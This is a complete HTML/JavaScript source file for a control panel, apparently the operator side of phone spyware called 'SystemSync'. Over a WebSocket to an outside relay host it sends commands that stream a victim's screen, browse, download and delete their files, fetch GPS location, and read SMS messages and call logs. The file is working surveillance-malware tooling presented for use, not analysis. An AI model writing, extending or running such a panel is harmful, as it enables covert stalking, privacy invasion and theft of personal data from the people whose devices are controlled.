<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SystemSync Console</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
    <style>
        /* ---------- CORE STYLES (Unchanged) ---------- */
        body { margin:0; background:#f5f7fa; font-family: 'Segoe UI', sans-serif; display:flex; height:100vh; overflow:hidden; }
        #sidebar { width:280px; background:white; border-right:1px solid #e0e4e8; padding:20px; overflow-y:auto; box-shadow:2px 0 5px rgba(0,0,0,0.02); }
        .logo { font-size:20px; font-weight:600; color:#1976ff; margin-bottom:30px; }
        .section { margin-bottom:25px; }
        .section-title { font-size:12px; font-weight:600; color:#7b8a9b; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:12px; }
        button { width:100%; padding:10px 12px; margin:4px 0; background:white; color:#1a2634; border:1px solid #d0d9e2; border-radius:8px; font-size:14px; text-align:left; cursor:pointer; transition:0.2s; display:flex; align-items:center; gap:8px; }
        button:hover { background:#1976ff; color:white; border-color:#1976ff; }
        #main { flex:1; display:flex; flex-direction:column; min-width:0; background:#f5f7fa; }
        #header { height:60px; background:white; border-bottom:1px solid #e0e4e8; display:flex; align-items:center; justify-content:space-between; padding:0 25px; font-weight:600; color:#1a2634; }
        #status { padding:6px 16px; border-radius:30px; background:#e8f0fe; color:#1976ff; font-weight:500; }
        #content { flex:1; padding:20px; overflow:auto; }
        #main-panel { background:white; border-radius:12px; box-shadow:0 2px 8px rgba(0,0,0,0.05); padding:20px; min-height:100%; position:relative; }

        /* ==================== NEW TREE-VIEW FILE MANAGER ==================== */
        .file-manager { display: flex; flex-direction: column; height: 100%; background: #0f0f0f; color: #e0e0e0; border-radius: 8px; overflow: hidden; }
        
        .top-actions { 
            display: flex; gap: 12px; padding: 12px 20px; background: #1a1a1a; 
            border-bottom: 1px solid #333; position: sticky; top: 0; z-index: 100; align-items: center; 
        }
        
        .top-actions .btn { 
            padding: 8px 16px; border-radius: 6px; border: none; font-size: 13px; 
            font-weight: 600; cursor: pointer; transition: transform 0.1s; 
        }
        
        .btn-download { background: #1976ff; color: white; }
        .btn-delete { background: #d32f2f; color: white; }
        .btn-back { background: #333; color: white; margin-right: auto; }
        .btn:active { transform: scale(0.95); }

        .tree-content { flex: 1; overflow-y: auto; padding: 15px; }
        .tree-root, .nested { list-style: none; padding-left: 25px; position: relative; }

        /* Lime Green Branch Lines */
        .tree-root::before, .nested::before { 
            content: ''; position: absolute; top: 0; left: 10px; width: 1px; height: 100%; background: #32cd32; 
        }
        .tree-item { position: relative; margin: 8px 0; }
        .tree-item::before { 
            content: ''; position: absolute; top: 15px; left: -15px; width: 15px; height: 1px; background: #32cd32; 
        }

        /* Animations */
        .nested { max-height: 0; overflow: hidden; transition: max-height 0.4s ease-in-out, opacity 0.3s; opacity: 0; }
        .nested.active { max-height: 2000px; opacity: 1; }
        
        /* Crimson Hover Effect */
        .folder-label { display: flex; align-items: center; cursor: pointer; transition: color 0.2s; }
        .folder-label:hover { color: #dc143c; }
        .folder-icon { margin-right: 10px; font-size: 18px; }
        
        .file-row { display: flex; align-items: center; padding: 4px 8px; border-radius: 4px; }
        .file-row:hover { background: #1a1a1a; }
        .file-checkbox { width: 16px; height: 16px; margin-right: 12px; cursor: pointer; }
        .item-name { flex: 1; font-size: 14px; }
        .file-size { font-size: 11px; color: #666; }
        /* ==================================================================== */

        /* Modal / Video Styles (Unchanged) */
        .modal-overlay { position:fixed; inset:0; background:rgba(0,0,0,0.9); display:none; justify-content:center; align-items:center; z-index:10000; }
        .modal-overlay.show { display: flex; }
        .mobile-popup { width:min(92vw, calc(92vh * 9 / 16)); height:92vh; display:flex; flex-direction:column; background:#0f0f0f; border-radius:26px; border:6px solid #2e2e2e; overflow:hidden; }
        .phone-frame { flex:1; display:flex; justify:center; align:center; background:black; overflow:hidden; }
        .phone-frame video { width:100%; height:100%; object-fit:contain; }
    </style>
</head>
<body>

<div id="screenModalOverlay" class="modal-overlay">
    <div class="mobile-popup">
        <div class="phone-frame">
            <video id="modalScreenVideo" autoplay playsinline></video>
        </div>
        <div class="popup-controls">
            <button id="modalCloseBtn" style="background:#c0392b; color:white; border:none; padding:10px; width:100%; cursor:pointer;">CLOSE SCREEN</button>
        </div>
    </div>
</div>

<div id="sidebar">
    <div class="logo">SystemSync</div>
    <div class="section">
        <div class="section-title">Surveillance</div>
        <button id="screenShareBtn">🖥 Start Screen</button>
        <button onclick="sendCommand('LIST_FILES', { path: 'root' })">📂 File Manager</button>
        <button onclick="sendCommand('GET_LOCATION')">📍 GPS Location</button>
    </div>
    <div class="section">
        <div class="section-title">Data</div>
        <button onclick="sendCommand('GET_SMS', { box: 'inbox' })">💬 SMS Inbox</button>
        <button onclick="sendCommand('GET_CALL_LOGS')">📞 Call Logs</button>
    </div>
</div>

<div id="main">
    <div id="header">
        <div>Control Panel</div>
        <span id="status">CONNECTING</span>
    </div>
    <div id="content">
        <div id="main-panel">Ready. Select an option from the sidebar.</div>
    </div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script type="module">
    // ---------- GLOBALS ----------
    const WS_URL = "wss://mirror-view.onrender.com";
    let ws = null;
    let currentData = [];
    let currentPath = "root";

    // ---------- NEW FILE MANAGER LOGIC ----------
    function renderFiles() {
        const panel = document.getElementById('main-panel');
        if (!panel) return;

        panel.innerHTML = `
            <div class="file-manager">
                <div class="top-actions">
                    <button class="btn btn-back" onclick="window.navigateUp()">⬆ Back</button>
                    <button class="btn btn-download" onclick="window.bulkDownload()">Download Selected</button>
                    <button class="btn btn-delete" onclick="window.bulkDelete()">Delete Selected</button>
                    <span style="font-size:11px; color:#666; margin-left:10px;">Path: ${currentPath}</span>
                </div>
                <div class="tree-content">
                    <ul class="tree-root" id="rootTree"></ul>
                </div>
            </div>
        `;

        const rootTree = document.getElementById('rootTree');

        // 1. Render Folders
        currentData.filter(item => item.isDir).forEach(f => {
            const li = document.createElement('li');
            li.className = 'tree-item';
            li.innerHTML = `
                <div class="folder-label" onclick="window.toggleNested(this, '${f.path}')">
                    <span class="folder-icon">📁</span>
                    <span class="item-name">${f.name}</span>
                </div>
                <ul class="nested" id="nested-${btoa(f.path).replace(/=/g, '')}"></ul>
            `;
            rootTree.appendChild(li);
        });

        // 2. Render Files
        currentData.filter(item => !item.isDir).forEach(f => {
            const li = document.createElement('li');
            li.className = 'tree-item';
            li.innerHTML = `
                <div class="file-row">
                    <input type="checkbox" class="file-checkbox" data-path="${f.path}">
                    <span class="file-icon">📄</span>
                    <span class="item-name">${f.name}</span>
                    <span class="file-size">${formatBytes(f.size)}</span>
                </div>
            `;
            rootTree.appendChild(li);
        });
    }

    window.toggleNested = (element, path) => {
        const nestedList = element.nextElementSibling;
        const icon = element.querySelector('.folder-icon');
        nestedList.classList.toggle('active');
        if (nestedList.classList.contains('active')) {
            icon.innerText = '📂';
            sendCommand('LIST_FILES', { path: path }); // Fetch sub-content
        } else {
            icon.innerText = '📁';
        }
    };

    window.bulkDownload = () => {
        const checked = document.querySelectorAll('.file-checkbox:checked');
        if (checked.length === 0) return alert("Select files first.");
        checked.forEach(cb => sendPlainText('dl ' + cb.getAttribute('data-path')));
    };

    window.bulkDelete = () => {
        const checked = document.querySelectorAll('.file-checkbox:checked');
        if (checked.length === 0) return alert("Select files first.");
        if (confirm(`Delete ${checked.length} files?`)) {
            checked.forEach(cb => sendCommand('DELETE_FILE', { path: cb.getAttribute('data-path') }));
        }
    };

    window.navigateUp = () => {
        if (currentPath === 'root' || currentPath === '') return;
        let parent = currentPath.split('/').slice(0, -1).join('/') || 'root';
        currentPath = parent;
        sendCommand('LIST_FILES', { path: parent });
    };

    // ---------- CORE WEBSOCKET / COMMANDS (Unchanged) ----------
    function connectWebSocket() {
        ws = new WebSocket(WS_URL);
        ws.onopen = () => { ws.send('I_AM_WEB'); setStatus('ONLINE'); };
        ws.onmessage = (e) => handleIncomingMessage(e.data);
        ws.onclose = () => { setStatus('OFFLINE'); setTimeout(connectWebSocket, 5000); };
    }

    function handleIncomingMessage(msg) {
        try {
            const json = JSON.parse(msg);
            if (json.type === 'FILE_LIST' || (Array.isArray(json) && json?.path)) {
                currentData = Array.isArray(json) ? json : json.data;
                renderFiles();
            }
        } catch (e) { /* Handle plain text */ }
    }

    function sendCommand(command, params = {}) {
        if (!ws || ws.readyState !== 1) return;
        ws.send(JSON.stringify({ type: 'COMMAND', command, params }));
    }

    function sendPlainText(msg) { ws.send(msg); }
    function setStatus(s) { document.getElementById('status').innerText = s; }
    function formatBytes(b) { return b === 0 ? '0 B' : (b / 1024).toFixed(1) + ' KB'; }

    connectWebSocket();
</script>
</body>
</html>
